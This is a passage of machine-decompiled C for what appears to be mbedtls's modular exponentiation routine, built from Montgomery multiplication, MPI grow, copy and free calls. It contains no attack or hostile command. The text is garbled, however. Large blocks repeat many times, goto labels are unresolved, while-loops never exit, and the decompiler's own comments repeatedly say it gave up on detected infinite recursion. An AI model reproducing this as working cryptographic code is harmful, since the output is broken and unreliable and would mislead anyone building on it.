                                                            v45 = mbedtls_mpi_copy((char *)g5, &v25);
                                                            g1 = v45;
                                                            if (v45 == 0) {
                                                                // 0x805983d
                                                                if (v19 != 0) {
                                                                    g4 = g3;
                                                                    v58 = g5;
                                                                    g1 = v58;
                                                                    g6 = v58;
                                                                    mpi_montmul((int64_t)g7, v29, v52, 0, 0);
                                                                    v34 = 1;
                                                                    while (v34 < v19) {
                                                                        // 0x805984f
                                                                        g4 = g3;
                                                                        v58 = g5;
                                                                        g1 = v58;
                                                                        g6 = v58;
                                                                        mpi_montmul((int64_t)g7, v29, v52, 0, 0);
                                                                        v34++;
                                                                        // continue -> 0x805984f
                                                                    }
                                                                    // 0x80598fe
                                                                    v35 = (int32_t)v18 + 1;
                                                                    v37 = 12 * v35 + v13;
                                                                    g5 = v37;
                                                                    if (v35 < v20) {
                                                                        v62 = v37;
                                                                        v66 = v35;
                                                                        while (true) {
                                                                            // 0x8059926
                                                                            v50 = mbedtls_mpi_grow(v62, (char *)(*(int32_t *)(g3 + 4) + 1));
                                                                            g1 = v50;
                                                                            if (v50 == 0) {
                                                                                goto lab_0x8059946_7;
                                                                            }
                                                                            result = v50;
                                                                            v67 = v29;
                                                                            // 0x80594ff
                                                                            v54 = v18;
                                                                            if (v20 > v54) {
                                                                                // 0x805950d
                                                                                v59 = 12 * v54 - 1612 + g2;
                                                                                // branch -> 0x8059528
                                                                                while (true) {
                                                                                    // 0x8059528
                                                                                    g3 = v59 + 12;
                                                                                    g1 = mbedtls_mpi_free((int32_t *)v59);
                                                                                    v60 = v54 + 1;
                                                                                    if (v20 > v60) {
                                                                                        goto lab_0x8059528_24;
                                                                                    }
                                                                                    // 0x805953a
                                                                                    g1 = result;
                                                                                    // branch -> 0x8059540
                                                                                }
                                                                            }
                                                                            // 0x8059540
                                                                            g6 = v26;
                                                                            g1 = mbedtls_mpi_free(&v25);
                                                                            g4 = v67;
                                                                            g1 = mbedtls_mpi_free((int32_t *)v67);
                                                                            mbedtls_mpi_free((int32_t *)v31);
                                                                            g1 = result;
                                                                            if (a5 != NULL) {
                                                                                // 0x805957d
                                                                                if (*(int32_t *)((int32_t)a5 + 8) != 0) {
                                                                                    // 0x80593be
                                                                                    g3 = v2;
                                                                                    g7 = v3;
                                                                                    g5 = v4;
                                                                                    return result;
                                                                                }
                                                                            }
                                                                            // 0x805958b
                                                                            g6 = &v6;
                                                                            mbedtls_mpi_free(&v6);
                                                                            // branch -> 0x80593be
                                                                            // 0x80593be
                                                                            g3 = v2;
                                                                            g7 = v3;
                                                                            g5 = v4;
                                                                            return result;
                                                                        }
                                                                    }
                                                                    // 0x8059989
                                                                    g5 = 0;
                                                                    v65 = 0;
                                                                    // branch -> 0x80599b5
                                                                    while (true) {
                                                                        // 0x80599b5
                                                                        v73 = 0;
                                                                        v71 = 0;
                                                                        v63 = *(int32_t *)(a3 + 4);
                                                                        // branch -> 0x80599b5
                                                                        goto lab_0x80599b5_12;
                                                                    }
                                                                }
                                                                // 0x80598fe
                                                                v35 = (int32_t)v18 + 1;
                                                                v37 = 12 * v35 + v13;
                                                                g5 = v37;
                                                                if (v35 < v20) {
                                                                    v62 = v37;
                                                                    v66 = v35;
                                                                    while (true) {
                                                                        // 0x8059926
                                                                        v50 = mbedtls_mpi_grow(v62, (char *)(*(int32_t *)(g3 + 4) + 1));
                                                                        g1 = v50;
                                                                        if (v50 == 0) {
                                                                            goto lab_0x8059946_7;
                                                                        }
                                                                        result = v50;
                                                                        v67 = v29;
                                                                        // 0x80594ff
                                                                        v54 = v18;
                                                                        if (v20 > v54) {
                                                                            // 0x805950d
                                                                            v59 = 12 * v54 - 1612 + g2;
                                                                            // branch -> 0x8059528
                                                                            while (true) {
                                                                                // 0x8059528
                                                                                g3 = v59 + 12;
                                                                                g1 = mbedtls_mpi_free((int32_t *)v59);
                                                                                v60 = v54 + 1;
                                                                                if (v20 > v60) {
                                                                                    goto lab_0x8059528_24;
                                                                                }
                                                                                // 0x805953a
                                                                                g1 = result;
                                                                                // branch -> 0x8059540
                                                                            }
                                                                        }
                                                                        // 0x8059540
                                                                        g6 = v26;
                                                                        g1 = mbedtls_mpi_free(&v25);
                                                                        g4 = v67;
                                                                        g1 = mbedtls_mpi_free((int32_t *)v67);
                                                                        mbedtls_mpi_free((int32_t *)v31);
                                                                        g1 = result;
                                                                        if (a5 != NULL) {
                                                                            // 0x805957d
                                                                            if (*(int32_t *)((int32_t)a5 + 8) != 0) {
                                                                                // 0x80593be
                                                                                g3 = v2;
                                                                                g7 = v3;
                                                                                g5 = v4;
                                                                                return result;
                                                                            }
                                                                        }
                                                                        // 0x805958b
                                                                        g6 = &v6;
                                                                        mbedtls_mpi_free(&v6);
                                                                        // branch -> 0x80593be
                                                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                                                    }
                                                                }
                                                                // 0x8059989
                                                                g5 = 0;
                                                                v65 = 0;
                                                                // branch -> 0x80599b5
                                                                while (true) {
                                                                    // 0x80599b5
                                                                    v73 = 0;
                                                                    v71 = 0;
                                                                    v63 = *(int32_t *)(a3 + 4);
                                                                    // branch -> 0x80599b5
                                                                    goto lab_0x80599b5_12;
                                                                }
                                                            } else {
                                                                result = v45;
                                                                v67 = v29;
                                                            }
                                                        }
                                                        // 0x80594ff
                                                        v54 = v18;
                                                        if (v20 > v54) {
                                                            // 0x805950d
                                                            v59 = 12 * v54 - 1612 + g2;
                                                            // branch -> 0x8059528
                                                            while (true) {
                                                                // 0x8059528
                                                                g3 = v59 + 12;
                                                                g1 = mbedtls_mpi_free((int32_t *)v59);
                                                                v60 = v54 + 1;
                                                                if (v20 > v60) {
                                                                    goto lab_0x8059528_24;
                                                                }
                                                                // 0x805953a
                                                                g1 = result;
                                                                // branch -> 0x8059540
                                                            }
                                                        }
                                                        // 0x8059540
                                                        g6 = v26;
                                                        g1 = mbedtls_mpi_free(&v25);
                                                        g4 = v67;
                                                        g1 = mbedtls_mpi_free((int32_t *)v67);
                                                        mbedtls_mpi_free((int32_t *)v31);
                                                        g1 = result;
                                                        if (a5 != NULL) {
                                                            // 0x805957d
                                                            if (*(int32_t *)((int32_t)a5 + 8) != 0) {
                                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                                            }
                                                        }
                                                        // 0x805958b
                                                        g6 = &v6;
                                                        mbedtls_mpi_free(&v6);
                                                        // branch -> 0x80593be
                                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                                    }
                                                    // 0x8059989
                                                    g5 = 0;
                                                    v65 = 0;
                                                    // branch -> 0x80599b5
                                                    while (true) {
                                                        // 0x80599b5
                                                        v73 = 0;
                                                        v71 = 0;
                                                        v63 = *(int32_t *)(a3 + 4);
                                                        // branch -> 0x80599b5
                                                        goto lab_0x80599b5_12;
                                                    }
                                                } else {
                                                    // 0x805977d
                                                    g1 = v43;
                                                    result = v43;
                                                    v67 = v29;
                                                    // branch -> 0x80594ff
                                                }
                                                // 0x80594ff
                                                v54 = v18;
                                                if (v20 > v54) {
                                                    // 0x805950d
                                                    v59 = 12 * v54 - 1612 + g2;
                                                    // branch -> 0x8059528
                                                    while (true) {
                                                        // 0x8059528
                                                        g3 = v59 + 12;
                                                        g1 = mbedtls_mpi_free((int32_t *)v59);
                                                        v60 = v54 + 1;
                                                        if (v20 > v60) {
                                                            goto lab_0x8059528_24;
                                                        }
                                                        // 0x805953a
                                                        g1 = result;
                                                        // branch -> 0x8059540
                                                    }
                                                }
                                                // 0x8059540
                                                g6 = v26;
                                                g1 = mbedtls_mpi_free(&v25);
                                                g4 = v67;
                                                g1 = mbedtls_mpi_free((int32_t *)v67);
                                                mbedtls_mpi_free((int32_t *)v31);
                                                g1 = result;
                                                if (a5 != NULL) {
                                                    // 0x805957d
                                                    if (*(int32_t *)((int32_t)a5 + 8) != 0) {
                                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                                    }
                                                }
                                                // 0x805958b
                                                g6 = &v6;
                                                mbedtls_mpi_free(&v6);
                                                // branch -> 0x80593be
                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                            } else {
                                                result = v49;
                                                v67 = v29;
                                            }
                                        } else {
                                            result = v48;
                                            v67 = v29;
                                        }
                                    } else {
                                        result = v47;
                                        v67 = v29;
                                    }
                                }
                                // 0x80594ff
                                v54 = v18;
                                if (v20 > v54) {
                                    // 0x805950d
                                    v59 = 12 * v54 - 1612 + g2;
                                    // branch -> 0x8059528
                                    while (true) {
                                        // 0x8059528
                                        g3 = v59 + 12;
                                        g1 = mbedtls_mpi_free((int32_t *)v59);
                                        v60 = v54 + 1;
                                        if (v20 > v60) {
                                            goto lab_0x8059528_24;
                                        }
                                        // 0x805953a
                                        g1 = result;
                                        // branch -> 0x8059540
                                    }
                                }
                                // 0x8059540
                                g6 = v26;
                                g1 = mbedtls_mpi_free(&v25);
                                g4 = v67;
                                g1 = mbedtls_mpi_free((int32_t *)v67);
                                mbedtls_mpi_free((int32_t *)v31);
                                g1 = result;
                                if (a5 != NULL) {
                                    // 0x805957d
                                    if (*(int32_t *)((int32_t)a5 + 8) != 0) {
                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                    }
                                }
                                // 0x805958b
                                g6 = &v6;
                                mbedtls_mpi_free(&v6);
                                // branch -> 0x80593be
                                // Detected a possible infinite recursion (goto support failed); quitting...
                            }
                            // 0x80596d2
                            v55 = (int32_t)a5;
                            if (a5 != NULL) {
                                // 0x80596dc
                                if (*(int32_t *)(v55 + 8) != 0) {
                                    // 0x80596e9
                                    v38 = &v6;
                                    g5 = v38;
                                    g7 = v55;
                                    v75 = v38;
                                    // branch -> 0x80596fe
                                    // 0x80596fe
                                    memcpy((char *)g5, (char *)g7, 3);
                                    v56 = (int32_t *)v33;
                                    v41 = mbedtls_mpi_cmp_mpi(v56, (int32_t *)g3);
                                    g1 = v41;
                                    if (v41 < 0) {
                                        // 0x8059870
                                        g7 = v33;
                                        g5 = v26;
                                        v46 = mbedtls_mpi_copy((char *)&v25, v56);
                                        g1 = v46;
                                        if (v46 != 0) {
                                            result = v46;
                                            v67 = v29;
                                            // 0x80594ff
                                            v54 = v18;
                                            if (v20 > v54) {
                                                // 0x805950d
                                                v59 = 12 * v54 - 1612 + g2;
                                                // branch -> 0x8059528
                                                while (true) {
                                                    // 0x8059528
                                                    g3 = v59 + 12;
                                                    g1 = mbedtls_mpi_free((int32_t *)v59);
                                                    v60 = v54 + 1;
                                                    if (v20 > v60) {
                                                        goto lab_0x8059528_24;
                                                    }
                                                    // 0x805953a
                                                    g1 = result;
                                                    // branch -> 0x8059540
                                                }
                                            }
                                            // 0x8059540
                                            g6 = v26;
                                            g1 = mbedtls_mpi_free(&v25);
                                            g4 = v67;
                                            g1 = mbedtls_mpi_free((int32_t *)v67);
                                            mbedtls_mpi_free((int32_t *)v31);
                                            g1 = result;
                                            if (a5 != NULL) {
                                                // 0x805957d
                                                if (*(int32_t *)((int32_t)a5 + 8) != 0) {
                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                }
                                            }
                                            // 0x805958b
                                            g6 = &v6;
                                            mbedtls_mpi_free(&v6);
                                            // branch -> 0x80593be
                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                        } else {
                                            v52 = v51;
                                        }
                                    } else {
                                        // 0x8059715
                                        v68 = g3;
                                        v42 = mbedtls_mpi_mod_mpi(v26, v33, v68);
                                        g1 = v42;
                                        if (v42 != 0) {
                                            result = v42;
                                            v67 = v29;
                                            // 0x80594ff
                                            v54 = v18;
                                            if (v20 > v54) {
                                                // 0x805950d
                                                v59 = 12 * v54 - 1612 + g2;
                                                // branch -> 0x8059528
                                                while (true) {
                                                    // 0x8059528
                                                    g3 = v59 + 12;
                                                    g1 = mbedtls_mpi_free((int32_t *)v59);
                                                    v60 = v54 + 1;
                                                    if (v20 > v60) {
                                                        goto lab_0x8059528_24;
                                                    }
                                                    // 0x805953a
                                                    g1 = result;
                                                    // branch -> 0x8059540
                                                }
                                            }
                                            // 0x8059540
                                            g6 = v26;
                                            g1 = mbedtls_mpi_free(&v25);
                                            g4 = v67;
                                            g1 = mbedtls_mpi_free((int32_t *)v67);
                                            mbedtls_mpi_free((int32_t *)v31);
                                            g1 = result;
                                            if (a5 != NULL) {
                                                // 0x805957d
                                                if (*(int32_t *)((int32_t)a5 + 8) != 0) {
                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                }
                                            }
                                            // 0x805958b
                                            g6 = &v6;
                                            mbedtls_mpi_free(&v6);
                                            // branch -> 0x80593be
                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                        } else {
                                            v52 = v68;
                                        }
                                    }
                                    // 0x8059736
                                    g4 = g3;
                                    g6 = v75;
                                    g1 = v26;
                                    v61 = -v16;
                                    g7 = v61;
                                    mpi_montmul((int64_t)v61, v29, v52, 0, 0);
                                    g5 = v75;
                                    v57 = v1;
                                    g1 = v57;
                                    v43 = mbedtls_mpi_copy((char *)v57, (int32_t *)v75);
                                    if (v43 == 0) {
                                        // 0x80597ae
                                        g1 = v1;
                                        v39 = &v53;
                                        g6 = v39;
                                        g4 = g3;
                                        v53 = 1;
                                        mpi_montmul((int64_t)g7, v29, v52, 0, 0);
                                        if (v21 != 1) {
                                            // 0x80597f0
                                            v36 = (int32_t)(12 * v18) + v13;
                                            g5 = v36;
                                            v44 = mbedtls_mpi_grow(v36, (char *)(*(int32_t *)(g3 + 4) + 1));
                                            g1 = v44;
                                            result = v44;
                                            v67 = v29;
                                            if (v44 == 0) {
                                                // 0x8059819
                                                g1 = v26;
                                                v45 = mbedtls_mpi_copy((char *)g5, &v25);
                                                g1 = v45;
                                                if (v45 == 0) {
                                                    // 0x805983d
                                                    if (v19 != 0) {
                                                        g4 = g3;
                                                        v58 = g5;
                                                        g1 = v58;
                                                        g6 = v58;
                                                        mpi_montmul((int64_t)g7, v29, v52, 0, 0);
                                                        v34 = 1;
                                                        while (v34 < v19) {
                                                            // 0x805984f
                                                            g4 = g3;
                                                            v58 = g5;
                                                            g1 = v58;
                                                            g6 = v58;
                                                            mpi_montmul((int64_t)g7, v29, v52, 0, 0);
                                                            v34++;
                                                            // continue -> 0x805984f
                                                        }
                                                        // 0x80598fe
                                                        v35 = (int32_t)v18 + 1;
                                                        v37 = 12 * v35 + v13;
                                                        g5 = v37;
                                                        if (v35 < v20) {
                                                            v62 = v37;
                                                            v66 = v35;
                                                            while (true) {
                                                                // 0x8059926
                                                                v50 = mbedtls_mpi_grow(v62, (char *)(*(int32_t *)(g3 + 4) + 1));
                                                                g1 = v50;
                                                                if (v50 == 0) {
                                                                    goto lab_0x8059946_7;
                                                                }
                                                                result = v50;
                                                                v67 = v29;
                                                                // 0x80594ff
                                                                v54 = v18;
                                                                if (v20 > v54) {
                                                                    // 0x805950d
                                                                    v59 = 12 * v54 - 1612 + g2;
                                                                    // branch -> 0x8059528
                                                                    while (true) {
                                                                        // 0x8059528
                                                                        g3 = v59 + 12;
                                                                        g1 = mbedtls_mpi_free((int32_t *)v59);
                                                                        v60 = v54 + 1;
                                                                        if (v20 > v60) {
                                                                            goto lab_0x8059528_24;
                                                                        }
                                                                        // 0x805953a
                                                                        g1 = result;
                                                                        // branch -> 0x8059540
                                                                    }
                                                                }
                                                                // 0x8059540
                                                                g6 = v26;
                                                                g1 = mbedtls_mpi_free(&v25);
                                                                g4 = v67;
                                                                g1 = mbedtls_mpi_free((int32_t *)v67);
                                                                mbedtls_mpi_free((int32_t *)v31);
                                                                g1 = result;
                                                                if (a5 != NULL) {
                                                                    // 0x805957d
                                                                    if (*(int32_t *)((int32_t)a5 + 8) != 0) {
                                                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                                                    }
                                                                }
                                                                // 0x805958b
                                                                g6 = &v6;
                                                                mbedtls_mpi_free(&v6);
                                                                // branch -> 0x80593be
                                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                                            }
                                                        }
                                                        // 0x8059989
                                                        g5 = 0;
                                                        v65 = 0;
                                                        // branch -> 0x80599b5
                                                        while (true) {
                                                            // 0x80599b5
                                                            v73 = 0;
                                                            v71 = 0;
                                                            v63 = *(int32_t *)(a3 + 4);
                                                            // branch -> 0x80599b5
                                                            goto lab_0x80599b5_12;
                                                        }
                                                    }
                                                    // 0x80598fe
                                                    v35 = (int32_t)v18 + 1;
                                                    v37 = 12 * v35 + v13;
                                                    g5 = v37;
                                                    if (v35 < v20) {
                                                        v62 = v37;
                                                        v66 = v35;
                                                        while (true) {
                                                            // 0x8059926
                                                            v50 = mbedtls_mpi_grow(v62, (char *)(*(int32_t *)(g3 + 4) + 1));
                                                            g1 = v50;
                                                            if (v50 == 0) {
                                                                goto lab_0x8059946_7;
                                                            }
                                                            result = v50;
                                                            v67 = v29;
                                                            // 0x80594ff
                                                            v54 = v18;
                                                            if (v20 > v54) {
                                                                // 0x805950d
                                                                v59 = 12 * v54 - 1612 + g2;
                                                                // branch -> 0x8059528
                                                                while (true) {
                                                                    // 0x8059528
                                                                    g3 = v59 + 12;
                                                                    g1 = mbedtls_mpi_free((int32_t *)v59);
                                                                    v60 = v54 + 1;
                                                                    if (v20 > v60) {
                                                                        goto lab_0x8059528_24;
                                                                    }
                                                                    // 0x805953a
                                                                    g1 = result;
                                                                    // branch -> 0x8059540
                                                                }
                                                            }
                                                            // 0x8059540
                                                            g6 = v26;
                                                            g1 = mbedtls_mpi_free(&v25);
                                                            g4 = v67;
                                                            g1 = mbedtls_mpi_free((int32_t *)v67);
                                                            mbedtls_mpi_free((int32_t *)v31);
                                                            g1 = result;
                                                            if (a5 != NULL) {
                                                                // 0x805957d
                                                                if (*(int32_t *)((int32_t)a5 + 8) != 0) {
                                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                                }
                                                            }
                                                            // 0x805958b
                                                            g6 = &v6;
                                                            mbedtls_mpi_free(&v6);
                                                            // branch -> 0x80593be
                                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                                        }
                                                    }
                                                    // 0x8059989
                                                    g5 = 0;
                                                    v65 = 0;
                                                    // branch -> 0x80599b5
                                                    while (true) {
                                                        // 0x80599b5
                                                        v73 = 0;
                                                        v71 = 0;
                                                        v63 = *(int32_t *)(a3 + 4);
                                                        // branch -> 0x80599b5
                                                        goto lab_0x80599b5_12;
                                                    }
                                                } else {
                                                    result = v45;
                                                    v67 = v29;
                                                }
                                            }
                                            // 0x80594ff
                                            v54 = v18;
                                            if (v20 > v54) {
                                                // 0x805950d
                                                v59 = 12 * v54 - 1612 + g2;
                                                // branch -> 0x8059528
                                                while (true) {
                                                    // 0x8059528
                                                    g3 = v59 + 12;
                                                    g1 = mbedtls_mpi_free((int32_t *)v59);
                                                    v60 = v54 + 1;
                                                    if (v20 > v60) {
                                                        goto lab_0x8059528_24;
                                                    }
                                                    // 0x805953a
                                                    g1 = result;
                                                    // branch -> 0x8059540
                                                }
                                            }
                                            // 0x8059540
                                            g6 = v26;
                                            g1 = mbedtls_mpi_free(&v25);
                                            g4 = v67;
                                            g1 = mbedtls_mpi_free((int32_t *)v67);
                                            mbedtls_mpi_free((int32_t *)v31);
                                            g1 = result;
                                            if (a5 != NULL) {
                                                // 0x805957d
                                                if (*(int32_t *)((int32_t)a5 + 8) != 0) {
                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                }
                                            }
                                            // 0x805958b
                                            g6 = &v6;
                                            mbedtls_mpi_free(&v6);
                                            // branch -> 0x80593be
                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                        }
                                        // 0x8059989
                                        g5 = 0;
                                        v65 = 0;
                                        // branch -> 0x80599b5
                                        while (true) {
                                            // 0x80599b5
                                            v73 = 0;
                                            v71 = 0;
                                            v63 = *(int32_t *)(a3 + 4);
                                            // branch -> 0x80599b5
                                            goto lab_0x80599b5_12;
                                        }
                                    } else {
                                        // 0x805977d
                                        g1 = v43;
                                        result = v43;
                                        v67 = v29;
                                        // branch -> 0x80594ff
                                    }
                                    // 0x80594ff
                                    v54 = v18;
                                    if (v20 > v54) {
                                        // 0x805950d
                                        v59 = 12 * v54 - 1612 + g2;
                                        // branch -> 0x8059528
                                        while (true) {
                                            // 0x8059528
                                            g3 = v59 + 12;
                                            g1 = mbedtls_mpi_free((int32_t *)v59);
                                            v60 = v54 + 1;
                                            if (v20 > v60) {
                                                goto lab_0x8059528_24;
                                            }
                                            // 0x805953a
                                            g1 = result;
                                            // branch -> 0x8059540
                                        }
                                    }
                                    // 0x8059540
                                    g6 = v26;
                                    g1 = mbedtls_mpi_free(&v25);
                                    g4 = v67;
                                    g1 = mbedtls_mpi_free((int32_t *)v67);
                                    mbedtls_mpi_free((int32_t *)v31);
                                    g1 = result;
                                    if (a5 != NULL) {
                                        // 0x805957d
                                        if (*(int32_t *)((int32_t)a5 + 8) != 0) {
                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                        }
                                    }
                                    // 0x805958b
                                    g6 = &v6;
                                    mbedtls_mpi_free(&v6);
                                    // branch -> 0x80593be
                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                }
                            }
                            // 0x8059892
                            v40 = &v6;
                            g7 = v40;
                            v47 = mbedtls_mpi_lset((char *)&v6, 1);
                            g1 = v47;
                            if (v47 == 0) {
                                // 0x80598b3
                                v48 = mbedtls_mpi_shift_l(g7, 64 * *(int32_t *)(g3 + 4));
                                g1 = v48;
                                if (v48 == 0) {
                                    // 0x80598cd
                                    v69 = g3;
                                    v70 = g7;
                                    v49 = mbedtls_mpi_mod_mpi(v70, v70, v69);
                                    g1 = v49;
                                    if (v49 == 0) {
                                        // 0x80598e5
                                        if (a5 == NULL) {
                                            // 0x80598e5
                                            dest_mem = g4;
                                            v75 = v40;
                                            // branch -> 0x80596fe
                                        } else {
                                            // 0x80598ef
                                            g5 = v55;
                                            dest_mem = (int32_t)memcpy(a5, (char *)g7, 3);
                                            v75 = v40;
                                            // branch -> 0x80596fe
                                        }
                                        // 0x80596fe
                                        memcpy((char *)g5, (char *)g7, dest_mem);
                                        v56 = (int32_t *)v33;
                                        v41 = mbedtls_mpi_cmp_mpi(v56, (int32_t *)g3);
                                        g1 = v41;
                                        if (v41 < 0) {
                                            // 0x8059870
                                            g7 = v33;
                                            g5 = v26;
                                            v46 = mbedtls_mpi_copy((char *)&v25, v56);
                                            g1 = v46;
                                            if (v46 != 0) {
                                                result = v46;
                                                v67 = v29;
                                                // 0x80594ff
                                                v54 = v18;
                                                if (v20 > v54) {
                                                    // 0x805950d
                                                    v59 = 12 * v54 - 1612 + g2;
                                                    // branch -> 0x8059528
                                                    while (true) {
                                                        // 0x8059528
                                                        g3 = v59 + 12;
                                                        g1 = mbedtls_mpi_free((int32_t *)v59);
                                                        v60 = v54 + 1;
                                                        if (v20 > v60) {
                                                            goto lab_0x8059528_24;
                                                        }
                                                        // 0x805953a
                                                        g1 = result;
                                                        // branch -> 0x8059540
                                                    }
                                                }
                                                // 0x8059540
                                                g6 = v26;
                                                g1 = mbedtls_mpi_free(&v25);
                                                g4 = v67;
                                                g1 = mbedtls_mpi_free((int32_t *)v67);
                                                mbedtls_mpi_free((int32_t *)v31);
                                                g1 = result;
                                                if (a5 != NULL) {
                                                    // 0x805957d
                                                    if (*(int32_t *)((int32_t)a5 + 8) != 0) {
                                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                                    }
                                                }
                                                // 0x805958b
                                                g6 = &v6;
                                                mbedtls_mpi_free(&v6);
                                                // branch -> 0x80593be
                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                            } else {
                                                v52 = v69;
                                            }
                                        } else {
                                            // 0x8059715
                                            v68 = g3;
                                            v42 = mbedtls_mpi_mod_mpi(v26, v33, v68);
                                            g1 = v42;
                                            if (v42 != 0) {
                                                result = v42;
                                                v67 = v29;
                                                // 0x80594ff
                                                v54 = v18;
                                                if (v20 > v54) {
                                                    // 0x805950d
                                                    v59 = 12 * v54 - 1612 + g2;
                                                    // branch -> 0x8059528
                                                    while (true) {
                                                        // 0x8059528
                                                        g3 = v59 + 12;
                                                        g1 = mbedtls_mpi_free((int32_t *)v59);
                                                        v60 = v54 + 1;
                                                        if (v20 > v60) {
                                                            goto lab_0x8059528_24;
                                                        }
                                                        // 0x805953a
                                                        g1 = result;
                                                        // branch -> 0x8059540
                                                    }
                                                }
                                                // 0x8059540
                                                g6 = v26;
                                                g1 = mbedtls_mpi_free(&v25);
                                                g4 = v67;
                                                g1 = mbedtls_mpi_free((int32_t *)v67);
                                                mbedtls_mpi_free((int32_t *)v31);
                                                g1 = result;
                                                if (a5 != NULL) {
                                                    // 0x805957d
                                                    if (*(int32_t *)((int32_t)a5 + 8) != 0) {
                                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                                    }
                                                }
                                                // 0x805958b
                                                g6 = &v6;
                                                mbedtls_mpi_free(&v6);
                                                // branch -> 0x80593be
                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                            } else {
                                                v52 = v68;
                                            }
                                        }
                                        // 0x8059736
                                        g4 = g3;
                                        g6 = v75;
                                        g1 = v26;
                                        v61 = -v16;
                                        g7 = v61;
                                        mpi_montmul((int64_t)v61, v29, v52, 0, 0);
                                        g5 = v75;
                                        v57 = v1;
                                        g1 = v57;
                                        v43 = mbedtls_mpi_copy((char *)v57, (int32_t *)v75);
                                        if (v43 == 0) {
                                            // 0x80597ae
                                            g1 = v1;
                                            v39 = &v53;
                                            g6 = v39;
                                            g4 = g3;
                                            v53 = 1;
                                            mpi_montmul((int64_t)g7, v29, v52, 0, 0);
                                            if (v21 != 1) {
                                                // 0x80597f0
                                                v36 = (int32_t)(12 * v18) + v13;
                                                g5 = v36;
                                                v44 = mbedtls_mpi_grow(v36, (char *)(*(int32_t *)(g3 + 4) + 1));
                                                g1 = v44;
                                                if (v44 == 0) {
                                                    // 0x8059819
                                                    g1 = v26;
                                                    v45 = mbedtls_mpi_copy((char *)g5, &v25);
                                                    g1 = v45;
                                                    if (v45 == 0) {
                                                        // 0x805983d
                                                        if (v19 != 0) {
                                                            g4 = g3;
                                                            v58 = g5;
                                                            g1 = v58;
                                                            g6 = v58;
                                                            mpi_montmul((int64_t)g7, v29, v52, 0, 0);
                                                            v34 = 1;
                                                            while (v34 < v19) {
                                                                // 0x805984f
                                                                g4 = g3;
                                                                v58 = g5;
                                                                g1 = v58;
                                                                g6 = v58;
                                                                mpi_montmul((int64_t)g7, v29, v52, 0, 0);
                                                                v34++;
                                                                // continue -> 0x805984f
                                                            }
                                                            // 0x80598fe
                                                            v35 = (int32_t)v18 + 1;
                                                            v37 = 12 * v35 + v13;
                                                            g5 = v37;
                                                            if (v35 < v20) {
                                                                v62 = v37;
                                                                v66 = v35;
                                                                while (true) {
                                                                    // 0x8059926
                                                                    v50 = mbedtls_mpi_grow(v62, (char *)(*(int32_t *)(g3 + 4) + 1));
                                                                    g1 = v50;
                                                                    if (v50 == 0) {
                                                                        goto lab_0x8059946_7;
                                                                    }
                                                                    result = v50;
                                                                    v67 = v29;
                                                                    // 0x80594ff
                                                                    v54 = v18;
                                                                    if (v20 > v54) {
                                                                        // 0x805950d
                                                                        v59 = 12 * v54 - 1612 + g2;
                                                                        // branch -> 0x8059528
                                                                        while (true) {
                                                                            // 0x8059528
                                                                            g3 = v59 + 12;
                                                                            g1 = mbedtls_mpi_free((int32_t *)v59);
                                                                            v60 = v54 + 1;
                                                                            if (v20 > v60) {
                                                                                goto lab_0x8059528_24;
                                                                            }
                                                                            // 0x805953a
                                                                            g1 = result;
                                                                            // branch -> 0x8059540
                                                                        }
                                                                    }
                                                                    // 0x8059540
                                                                    g6 = v26;
                                                                    g1 = mbedtls_mpi_free(&v25);
                                                                    g4 = v67;
                                                                    g1 = mbedtls_mpi_free((int32_t *)v67);
                                                                    mbedtls_mpi_free((int32_t *)v31);
                                                                    g1 = result;
                                                                    if (a5 != NULL) {
                                                                        // 0x805957d
                                                                        if (*(int32_t *)((int32_t)a5 + 8) != 0) {
                                                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                                                        }
                                                                    }
                                                                    // 0x805958b
                                                                    g6 = &v6;
                                                                    mbedtls_mpi_free(&v6);
                                                                    // branch -> 0x80593be
                                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                                }
                                                            }
                                                            // 0x8059989
                                                            g5 = 0;
                                                            v65 = 0;
                                                            // branch -> 0x80599b5
                                                            while (true) {
                                                                // 0x80599b5
                                                                v73 = 0;
                                                                v71 = 0;
                                                                v63 = *(int32_t *)(a3 + 4);
                                                                // branch -> 0x80599b5
                                                                goto lab_0x80599b5_12;
                                                            }
                                                        }
                                                        // 0x80598fe
                                                        v35 = (int32_t)v18 + 1;
                                                        v37 = 12 * v35 + v13;
                                                        g5 = v37;
                                                        if (v35 < v20) {
                                                            v62 = v37;
                                                            v66 = v35;
                                                            while (true) {
                                                                // 0x8059926
                                                                v50 = mbedtls_mpi_grow(v62, (char *)(*(int32_t *)(g3 + 4) + 1));
                                                                g1 = v50;
                                                                if (v50 == 0) {
                                                                    goto lab_0x8059946_7;
                                                                }
                                                                result = v50;
                                                                v67 = v29;
                                                                // 0x80594ff
                                                                v54 = v18;
                                                                if (v20 > v54) {
                                                                    // 0x805950d
                                                                    v59 = 12 * v54 - 1612 + g2;
                                                                    // branch -> 0x8059528
                                                                    while (true) {
                                                                        // 0x8059528
                                                                        g3 = v59 + 12;
                                                                        g1 = mbedtls_mpi_free((int32_t *)v59);
                                                                        v60 = v54 + 1;
                                                                        if (v20 > v60) {
                                                                            goto lab_0x8059528_24;
                                                                        }
                                                                        // 0x805953a
                                                                        g1 = result;
                                                                        // branch -> 0x8059540
                                                                    }
                                                                }
                                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                                            }
                                                        }
                                                        // 0x8059989
                                                        g5 = 0;
                                                        v65 = 0;
